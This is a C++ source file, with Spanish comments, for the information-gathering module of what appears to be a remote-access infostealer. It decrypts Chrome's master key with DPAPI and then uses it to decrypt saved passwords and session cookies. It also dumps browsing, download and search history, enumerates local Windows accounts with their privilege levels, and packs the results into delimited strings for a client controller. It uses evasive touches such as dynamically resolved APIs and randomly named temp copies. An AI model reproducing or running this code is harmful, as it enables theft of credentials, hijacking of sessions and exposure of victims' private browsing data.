#include "cliente.hpp"
#include "mod_info.hpp"
#include "misc.hpp"

extern Cliente* cCliente;

mod_Info::mod_Info(st_Bcrypt& _bcrypt, st_Crypt32& _crypt32, st_Netapi32& _netapi32) {
	//Cargar dll's y funciones
	
	this->BCRYPT = _bcrypt;
	this->CRYPT32 = _crypt32;
	this->NETAPI32 = _netapi32;

	if (!this->BCRYPT.pBCryptOpenAlgorithmProvider || !this->BCRYPT.pBCryptCloseAlgorithmProvider || !this->BCRYPT.pBCryptSetProperty) {
		__DBG_("[dynamic] No se pudieron cargar las funciones");
		return;
	}

	NTSTATUS nStatus = 0;

	nStatus = this->BCRYPT.pBCryptOpenAlgorithmProvider(&this->hAlgorithm, BCRYPT_AES_ALGORITHM, NULL, 0);
	if (!BCRYPT_SUCCESS(nStatus)) {
		__DBG_("BCryptOpenAlgorithmProvider error");
		__DBG_(nStatus);
		return;
	}

	nStatus = this->BCRYPT.pBCryptSetProperty(this->hAlgorithm, BCRYPT_CHAINING_MODE, (UCHAR*)BCRYPT_CHAIN_MODE_GCM, sizeof(BCRYPT_CHAIN_MODE_GCM), 0);
	if (!BCRYPT_SUCCESS(nStatus)) {
		__DBG_("BCryptSetProperty error");
		__DBG_(nStatus);
		this->BCRYPT.pBCryptCloseAlgorithmProvider(this->hAlgorithm, 0);
		return;
	}
}

mod_Info::~mod_Info() {
	if (this->hAlgorithm) {
		if (this->BCRYPT.pBCryptCloseAlgorithmProvider) {
			this->BCRYPT.pBCryptCloseAlgorithmProvider(this->hAlgorithm, 0);
		}
	}
}

std::vector<std::vector<std::string>> mod_Info::m_GimmeTheL00t(const char* cQuery, const char* cPath) {
	std::vector<std::vector<std::string>> vcOut;
	std::string strRandomPath = RandomID(7);
	if (cCliente->mod_dynamic->KERNEL32.pCopyFileA) {
		if (cCliente->mod_dynamic->KERNEL32.pCopyFileA((LPCSTR)cPath, (LPCSTR)strRandomPath.c_str(), FALSE)) {
			sqlite3* db;

			int iRet = sqlite3_open(strRandomPath.c_str(), &db);

			if (iRet == SQLITE_OK) {
				sqlite3_stmt* pStmt;

				iRet = sqlite3_prepare(db, cQuery, -1, &pStmt, 0);

				if (iRet == SQLITE_OK) {
					iRet = sqlite3_step(pStmt);
					while (iRet == SQLITE_ROW) {
						int iColumnCount = sqlite3_column_count(pStmt);
						std::vector<std::string> vcTemp;
						if (iColumnCount > 0) {
							for (int index = 0; index < iColumnCount; index++) {
								vcTemp.push_back(reinterpret_cast<const char*>(sqlite3_column_text(pStmt, index)));
							}
						}
						vcOut.push_back(vcTemp);
						iRet = sqlite3_step(pStmt);
					}
				}
				sqlite3_finalize(pStmt);
				sqlite3_close(db);
			}
		}else {
			_DBG_("No se pudo copiar la bd del usuario ", GetLastError());
		}
		if (cCliente->mod_dynamic->KERNEL32.pDeleteFileA) {
			cCliente->mod_dynamic->KERNEL32.pDeleteFileA(strRandomPath.c_str());
		}
	}
	return vcOut;
}

//https://github.com/oomar400/Malware-Development/tree/main/Malware101%3AInfostealers
std::string mod_Info::m_DecryptData(const std::string& strPass) {

	size_t encSize = strPass.size();
	std::string strOut = "ENCRYPTED_ERR";

	if (!this->BCRYPT.pBCryptDecrypt) {
		return strOut;
	}
	
	if (!this->isBcrptOK || encSize < 31) {
		return strOut;
	}else if (strPass.substr(0, 3) == "v20") {
		return "V20 Cookie :v";
	}

	NTSTATUS nStatus = 0;

	ULONG uPlainSize =              0;

	std::vector<BYTE> vc_CipherPass(encSize);
	std::vector<BYTE> vc_Plain;
	std::vector<BYTE> IV(12);

	memcpy(IV.data(), strPass.data() + 3, 12);
	memcpy(vc_CipherPass.data(), strPass.data() + 15, encSize - 15);

	size_t tagOffset = encSize - 31;
	if (tagOffset < 0 || tagOffset > vc_CipherPass.size()) {
		__DBG_("Error parseando el offset");
		return strOut;
	}

	BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO authInfo;
	BCRYPT_INIT_AUTH_MODE_INFO(authInfo);
	authInfo.pbNonce = IV.data();
	authInfo.cbNonce = 12;
	authInfo.pbTag = vc_CipherPass.data() + tagOffset;
	authInfo.cbTag = 16;
	authInfo.dwFlags &= ~BCRYPT_AUTH_MODE_CHAIN_CALLS_FLAG;

	nStatus = this->BCRYPT.pBCryptDecrypt(this->hKey, vc_CipherPass.data(), tagOffset, &authInfo, NULL, 0, NULL, NULL, &uPlainSize, 0);
	if (!BCRYPT_SUCCESS(nStatus)) {
		_DBG_("BCryptDecrypt_1 error", GetLastError());
		return strOut;
	}

	vc_Plain.resize(uPlainSize);

	nStatus = this->BCRYPT.pBCryptDecrypt(this->hKey, vc_CipherPass.data(), tagOffset, &authInfo, NULL, 0, vc_Plain.data(), uPlainSize, &uPlainSize, 0);
	if (!BCRYPT_SUCCESS(nStatus)) {
		_DBG_("BCryptDecrypt_2", nStatus);
		return strOut;
	}
	
	strOut = std::string(vc_Plain.begin(), vc_Plain.end());

	return strOut;
}

std::string mod_Info::m_DecryptMasterKey(const std::string& strPass) {
	DATA_BLOB encryptedPass, decryptedPass;
	std::string strOut = "";

	if (!this->CRYPT32.pCryptUnprotectData) {
		return strOut;
	}

	std::string strTmp = strPass;
	strTmp.erase(strTmp.find_last_not_of(" \n\r\t") + 1);

	encryptedPass.cbData = (DWORD)strTmp.size();
	encryptedPass.pbData = (byte*)malloc((int)encryptedPass.cbData);
	if (!encryptedPass.pbData) {
		return strOut;
	}
	memcpy(encryptedPass.pbData, strTmp.data(), (int)encryptedPass.cbData);
	
	if (!this->CRYPT32.pCryptUnprotectData(
		&encryptedPass, // In Data
		NULL,			// Optional ppszDataDescr: pointer to a string-readable description of the encrypted data 
		NULL,           // Optional entropy
		NULL,           // Reserved
		NULL,           // Here, the optional
		// prompt structure is not
		// used.
		0,
		&decryptedPass)) {
		__DBG_("Error desencriptando la password");
		__DBG_(GetLastError());
	}else {
		strOut = reinterpret_cast<const char*>(decryptedPass.pbData);
	}
	
	free(encryptedPass.pbData); encryptedPass.pbData = NULL;
	LocalFree(decryptedPass.pbData);
	
	return strOut;
}

std::vector<Chrome_Profile> mod_Info::m_ChromeProfiles() {
	int iBuffSize = 4096;
	std::vector<Chrome_Profile> vcOut;

	LPSTR env_var = (LPSTR)malloc(iBuffSize);
	if (env_var == NULL) {
		__DBG_("No se pudo reservar memoria");
		return vcOut;
	}
	
	if (GetEnvironmentVariable("APPDATA", env_var, iBuffSize) == 0) {
		_DBG_("Error", GetLastError());
		return vcOut;
	}
	
	std::string strPath = env_var;
	
	free(env_var); env_var = NULL;

	std::vector<std::string> vcTemp = strSplit(strPath, '\\', 1024);
	vcTemp.pop_back();
	
	strPath = "";
	for (std::string sub_path : vcTemp) {
		strPath += sub_path + "\\";
	}
	strPath += "Local\\Google\\Chrome\\User Data\\";

	this->strBasePath = strPath;
	
	//Copiar archivo que contiene la llave maestra e informacion de perfiles de chrome
	std::string strFile = strPath + "Local State";

	if (cCliente->mod_dynamic->KERNEL32.pCopyFileA) {
		if (!cCliente->mod_dynamic->KERNEL32.pCopyFileA((LPCSTR)strFile.c_str(), "saramambichi", FALSE)) {
			__DBG_("No se pudo copiar el archivo local state");
			__DBG_(GetLastError());
			return vcOut;
		}
	}else {
		return vcOut;
	}

	std::ifstream iFile("saramambichi");
	if (iFile.is_open()) {
		nlohmann::json jeyson = nlohmann::json::parse(iFile);
		if (!jeyson.is_null()) {
			this->vcChromeProfiles.clear();

			//Informacion de perfiles de chrome
			for (auto& itm : jeyson["profile"]["info_cache"].items()) {
				std::string temp_Path = strPath + itm.key() + "\\";
				Chrome_Profile nProfile;
				nProfile.strPath = temp_Path;
				nProfile.strName         = itm.value()["name"         ];
				if (nProfile.strName.size() == 0) { nProfile.strName = "-"; }
				nProfile.strGaiaName     = itm.value()["gaia_name"    ];
				if (nProfile.strGaiaName.size() == 0) { nProfile.strGaiaName = "-"; }
				nProfile.strShortCutName = itm.value()["shortcut_name"];
				if (nProfile.strShortCutName.size() == 0) { nProfile.strShortCutName = "-"; }
				nProfile.strUserName     = itm.value()["user_name"    ];
				if (nProfile.strUserName.size() == 0) { nProfile.strUserName = "-"; }
				nProfile.strHostedDomain = itm.value()["hosted_domain"];
				if (nProfile.strHostedDomain.size() == 0) { nProfile.strHostedDomain = "-"; }
				vcOut.push_back(nProfile);

				this->vcChromeProfiles.push_back(nProfile);
			}

			//##################################################################################
			//                          Desencriptar llave maestra
			//##################################################################################
			if (this->BCRYPT.pBCryptGenerateSymmetricKey || this->BCRYPT.pBCryptCloseAlgorithmProvider) {
				std::string strMasterKey = base64_decode(jeyson["os_crypt"]["encrypted_key"]);

				strMasterKey = strMasterKey.substr(5, strMasterKey.size() - 5);

				strMasterKey = this->m_DecryptMasterKey(strMasterKey);

				this->vcChromeKey.resize(strMasterKey.size());

				memcpy(this->vcChromeKey.data(), strMasterKey.data(), strMasterKey.size());

				DATA_BLOB MasterKey;
				MasterKey.cbData = this->vcChromeKey.size();
				MasterKey.pbData = this->vcChromeKey.data();
				NTSTATUS nStatus = this->BCRYPT.pBCryptGenerateSymmetricKey(this->hAlgorithm, &this->hKey, NULL, 0, MasterKey.pbData, MasterKey.cbData, 0);
				if (!BCRYPT_SUCCESS(nStatus)) {
					_DBG_("encrypted_key BCryptGenerateSymmetricKey  error", nStatus);
					this->BCRYPT.pBCryptCloseAlgorithmProvider(this->hAlgorithm, 0);
				}
				else {
					this->isBcrptOK = true;
				}
			}
			//##################################################################################
			//##################################################################################
		}
		iFile.close();
	}

	if (cCliente->mod_dynamic->KERNEL32.pDeleteFileA) {
		cCliente->mod_dynamic->KERNEL32.pDeleteFileA("saramambichi");
	}
	
	return vcOut;
}

std::vector<Chrome_Login_Data> mod_Info::m_ProfilePasswords(const std::string& strUserPath) {
	std::vector<Chrome_Login_Data> vcOut;
	/*
	TABLE  : logins
	COLUMNS: origin_url, action_url, username_value, password_value
	*/
	std::string strPath = strUserPath + "Login Data";
	std::vector<std::vector<std::string>> vcData = this->m_GimmeTheL00t("SELECT origin_url, action_url, username_value, password_value FROM logins;", strPath.c_str());
	if (vcData.size() > 0) {
		for (std::vector<std::string>& item : vcData) {
			if (item.size() == 4) {
				if (item[0].size() > 0 && item[1].size() > 0 && item[2].size() > 0 && item[3].size() > 0) {
					Chrome_Login_Data nPassword;
					nPassword.strUrl      = item[0];
					if (nPassword.strUrl == "") { nPassword.strUrl = "-"; }
					nPassword.strAction   = item[1];
					if (nPassword.strAction == "") { nPassword.strAction = "-"; }
					nPassword.strUser     = item[2];
					if (nPassword.strUser == "") { nPassword.strUser = "-"; }
					nPassword.strPassword = this->m_DecryptData(item[3]);
					
					vcOut.push_back(nPassword);
				}
			}
		}
	}
	return vcOut;
}

std::vector<Cookie> mod_Info::m_ProfileCookies(const std::string& strUserPath) {
	std::vector<Cookie> vcOut;
	/*
	TABLE   : cookies
	COLUMNS : creation_utc, host_key, name, encrypted_value, path, expires_utc, last_access_utc, last_update_utc
	*/
	std::string strPath = strUserPath + "Network\\Cookies";
	std::vector<std::vector<std::string>> vcData = this->m_GimmeTheL00t("SELECT  creation_utc, host_key, name, encrypted_value, path, expires_utc, last_access_utc, last_update_utc FROM cookies WHERE encrypted_value != '';", strPath.c_str());
	if (vcData.size() > 0) {
		for (std::vector<std::string>& item : vcData) {
			if (item.size() == 8) {
				if (item[3].size() > 0) {
					Cookie nCookie;
					nCookie.strCreationUTC   = item[0];
					nCookie.strHostKey       = item[1];
					nCookie.strName          = item[2];

					//Decrypt value
					nCookie.strValue = this->m_DecryptData(item[3]);

					nCookie.strPath          = item[4];
					nCookie.strExpiresUTC    = item[5];
					nCookie.strLastAccessUTC = item[6];
					nCookie.strLastUpdateUTC = item[7];
				
					vcOut.push_back(nCookie);
				}
			}
		}
	}

	return vcOut;
}

std::vector<Chrome_Search_Terms> mod_Info::m_ProfileSearchTerms(const std::string& strUserPath) {
	std::vector<Chrome_Search_Terms> vcOut;
	/*
	TABLE    : keyword_search_terms
	COLUMN(s): term
	*/
	std::string strPath = strUserPath + "History";
	std::vector<std::vector<std::string>> vcData = this->m_GimmeTheL00t("SELECT term FROM keyword_search_terms;", strPath.c_str());
	if (vcData.size() > 0) {
		for (std::vector<std::string>& item : vcData) {
			if (item.size() == 1) {
				Chrome_Search_Terms nTerm;
				nTerm.strTerm = item[0];
				vcOut.push_back(nTerm);
			}
		}
	}
	return vcOut;
}

std::vector<Chrome_History> mod_Info::m_ProfileBrowsingHistory(const std::string& strUserPath) {
	std::vector<Chrome_History> vcOut;
	/*
	TABLE   : urls
	COLUMNS : url title visit_count last_visit_time
	COUNT   : 4
	*/
	std::string strPath = strUserPath + "History";
	std::vector<std::vector<std::string>> vcData = this->m_GimmeTheL00t("SELECT url, title, visit_count, last_visit_time FROM urls;", strPath.c_str());
	if (vcData.size() > 0) {
		for (std::vector<std::string>& item : vcData) {
			if (item.size() == 4) {
				Chrome_History nHistory;
				nHistory.strURL           = item[0];
				nHistory.strTitle         = item[1];
				nHistory.strVisitCount    = item[2];
				nHistory.strLastVisitTime = TimeToDays(atoll(item[3].c_str()));
				vcOut.push_back(nHistory);
			}
		}
	}
	return vcOut;
}

std::vector<Chrome_Download_History> mod_Info::m_ProfileDownloadHistory(const std::string& strUserPath) {
	std::vector<Chrome_Download_History> vcOut;
	/*
	TABLE   : downloads
	COLUMNS :	target_path	 start_time	 total_bytes tab_url	 mime_type
	COUNT   : 5
	*/
	std::string strPath = strUserPath + "History";
	std::vector<std::vector<std::string>> vcData = this->m_GimmeTheL00t("SELECT target_path, start_time, total_bytes, tab_url, mime_type FROM downloads;", strPath.c_str());
	if (vcData.size() > 0) {
		for (std::vector<std::string>& item : vcData) {
			if (item.size() == 5) {
				Chrome_Download_History nDownload;
				nDownload.strTargetPath = item[0];
				nDownload.strStartTime  = item[1];
				nDownload.strTotalBytes = item[2];
				nDownload.strTabURL     = item[3];
				nDownload.strMimeType   = item[4];
				vcOut.push_back(nDownload);
			}
		}
	}
	return vcOut;
}

std::string mod_Info::m_GetProfileData(const std::string& strPath, const char cOption) {
	std::string strOut = "";
	strOut.append(1, cOption);
	strOut.append(1, CMD_DEL);

	switch (cOption){
		case '1':
			//Passwords
			for (Chrome_Login_Data& login_data : this->m_ProfilePasswords(strPath)) {
				strOut += login_data.strUrl;
				strOut += CMD_DEL_2;
				strOut += login_data.strAction;
				strOut += CMD_DEL_2;
				strOut += login_data.strUser;
				strOut += CMD_DEL_2;
				strOut += login_data.strPassword;
				strOut += ":[<>]:";
			}
			break;
		case '2':
			//historial navegacion
			for (Chrome_History& history_data : this->m_ProfileBrowsingHistory(strPath)) {
				strOut += history_data.strURL;
				strOut += CMD_DEL_2;
				strOut += history_data.strTitle;
				strOut += CMD_DEL_2;
				strOut += history_data.strVisitCount;
				strOut += CMD_DEL_2;
				strOut += history_data.strLastVisitTime;
				strOut += ":[<>]:";
			}
			break;
		case '3':
			//Historial descargas
			for (Chrome_Download_History& history_down_data : this->m_ProfileDownloadHistory(strPath)) {
				strOut += history_down_data.strTargetPath;
				strOut += CMD_DEL_2;
				strOut += history_down_data.strStartTime;
				strOut += CMD_DEL_2;
				strOut += history_down_data.strTotalBytes;
				strOut += CMD_DEL_2;
				strOut += history_down_data.strTabURL;
				strOut += CMD_DEL_2;
				strOut += history_down_data.strMimeType;
				strOut += ":[<>]:";
			}
			break;
		case '4':
			//Historial busquedas
			for (Chrome_Search_Terms history_search : this->m_ProfileSearchTerms(strPath)) {
				strOut += history_search.strTerm;
				strOut += ":[<>]:";
			}
			break;
		case '5':
			//Cookies
			for (Cookie& cookie_data : this->m_ProfileCookies(strPath)) {
				if (cookie_data.strValue != "V20 Cookie :v" && cookie_data.strValue != "ENCRYPTED_ERR") {
					strOut += cookie_data.strCreationUTC;
					strOut += CMD_DEL_2;
					strOut += cookie_data.strHostKey;
					strOut += CMD_DEL_2;
					strOut += cookie_data.strName;
					strOut += CMD_DEL_2;
					strOut += cookie_data.strValue;
					strOut += CMD_DEL_2;
					strOut += cookie_data.strPath;
					strOut += CMD_DEL_2;
					strOut += cookie_data.strExpiresUTC;
					strOut += CMD_DEL_2;
					strOut += cookie_data.strLastAccessUTC;
					strOut += CMD_DEL_2;
					strOut += cookie_data.strLastUpdateUTC;
					strOut += ":[<>]:";
				}
			}
			break;
		default:
			break;
	}

	if (strOut.size() > 6) {
		strOut = strOut.substr(0, strOut.size() - 6);
	}

	return strOut;
}

std::string mod_Info::m_GetUsersData() {
	std::string strOut = "";
	for (User_Info usuario : this->m_Usuarios()) {
		strOut += usuario.strUserName;
		strOut += CMD_DEL_2;
		strOut += usuario.strComment;
		strOut += CMD_DEL_2;
		strOut += usuario.strFullName;
		strOut += CMD_DEL_2;
		strOut += TimeToDays(usuario.dwPasswordAge); 
		strOut += CMD_DEL_2;
		strOut += usuario.strHomeDir;
		strOut += CMD_DEL_2;
		strOut += std::to_string(usuario.dwLastLogon);
		strOut += CMD_DEL_2;
		strOut += std::to_string(usuario.dwLastLogOff);
		strOut += CMD_DEL_2;
		strOut += std::to_string(usuario.dwBadPwCount);
		strOut += CMD_DEL_2;
		strOut += std::to_string(usuario.dwNumLogons);
		strOut += CMD_DEL_2;
		strOut += usuario.strLogonServer;
		strOut += CMD_DEL_2;
		strOut += std::to_string(usuario.dwCountryCode);
		strOut += ":[<>]:";
	}

	if (strOut.size() > 6) {
		strOut = strOut.substr(0, strOut.size() - 6);
	}
	return strOut;
}

std::vector<User_Info> mod_Info::m_Usuarios() {
	std::vector<User_Info> vcOut;

	if (!this->NETAPI32.pNetUserEnum || !this->NETAPI32.pNetApiBufferFree) {
		return vcOut;
	}

	LPUSER_INFO_11 lUsers = nullptr;
	LPUSER_INFO_11 lTmpuser = nullptr;
	DWORD dCount = 0, dHints = 0;
	NET_API_STATUS nStatus;
	do {
		nStatus = this->NETAPI32.pNetUserEnum(nullptr, 11, 0, (LPBYTE*)&lUsers, MAX_PREFERRED_LENGTH, &dCount, &dHints, 0);
		if ((nStatus == NERR_Success) || (nStatus == ERROR_MORE_DATA)) {
			if ((lTmpuser = lUsers) != nullptr) {
				for (DWORD i = 0; (i < dCount); i++) {
					if (lUsers == NULL) {
						__DBG_("lUsers = NULL")
						break;
					}
					std::string strTempUser = this->toString(lTmpuser->usri11_name);
					if (strTempUser != "") {
						User_Info new_User;
						new_User.strComment = this->toString(lTmpuser->usri11_comment);
						new_User.strFullName = this->toString(lTmpuser->usri11_full_name);
						new_User.dwPasswordAge = lTmpuser->usri11_password_age;
						new_User.strHomeDir = this->toString(lTmpuser->usri11_home_dir);
						new_User.dwLastLogon = lTmpuser->usri11_last_logon;
						new_User.dwLastLogOff = lTmpuser->usri11_last_logoff;
						new_User.dwBadPwCount = lTmpuser->usri11_bad_pw_count;
						new_User.dwNumLogons = lTmpuser->usri11_num_logons;
						new_User.strLogonServer = this->toString(lTmpuser->usri11_logon_server);
						new_User.dwCountryCode = lTmpuser->usri11_country_code;
						
						if (lTmpuser->usri11_priv == USER_PRIV_ADMIN) {
							strTempUser += " (ADMIN)";
						}else if (lTmpuser->usri11_priv == USER_PRIV_USER) {
							strTempUser += " (USER)";
						}else {
							strTempUser += " (GUEST)";
						}

						new_User.strUserName = strTempUser;

						vcOut.push_back(new_User);
					}
					lTmpuser++;
				}
			}
		}
		if (lUsers != nullptr) {
			this->NETAPI32.pNetApiBufferFree(lUsers);
			lUsers = nullptr;
		}
	} while (nStatus == ERROR_MORE_DATA);
	if (lUsers != nullptr) {
		this->NETAPI32.pNetApiBufferFree(lUsers);
		lUsers = nullptr;
	}
	return vcOut;
}
